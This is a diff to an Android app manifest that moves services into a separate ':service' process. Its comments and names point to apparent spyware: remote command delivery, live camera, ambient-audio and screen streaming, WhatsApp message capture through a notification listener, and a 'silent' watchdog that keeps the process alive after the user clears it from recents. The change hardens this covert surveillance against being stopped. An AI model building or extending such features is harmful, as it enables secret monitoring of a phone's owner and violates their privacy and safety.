@@ -158,6 +158,7 @@
         <!-- FCM push — instant command delivery (Phase 6) -->
         <service
             android:name=".fcm.SpappFirebaseMessagingService"
+            android:process=":service"
             android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
@@ -179,6 +180,7 @@
             android:name=".blocking.BlockAccessibilityService"
             android:exported="true"
             android:stopWithTask="false"
+            android:process=":service"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -193,6 +195,7 @@
             android:name=".camerastream.CameraStreamService"
             android:exported="false"
             android:stopWithTask="false"
+            android:process=":service"
             android:foregroundServiceType="camera" />
 
         <!-- Live surrounding / ambient audio streaming service -->
@@ -200,6 +203,7 @@
             android:name=".audiostream.AudioStreamService"
             android:exported="false"
             android:stopWithTask="false"
+            android:process=":service"
             android:foregroundServiceType="microphone" />
 
         <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
@@ -207,6 +211,7 @@
             android:name=".screenstream.ScreenStreamService"
             android:exported="false"
             android:stopWithTask="false"
+            android:process=":service"
             android:foregroundServiceType="dataSync" />
 
         <!-- Persistent silent background watchdog to keep process alive across recents clear -->
@@ -214,6 +219,7 @@
             android:name=".sync.PersistentWatchdogService"
             android:exported="false"
             android:stopWithTask="false"
+            android:process=":service"
             android:foregroundServiceType="dataSync" />
 
         <!-- Notification listener for WhatsApp chat message capture -->
@@ -221,6 +227,7 @@
             android:name=".collectors.WhatsAppNotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:stopWithTask="false"
+            android:process=":service"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
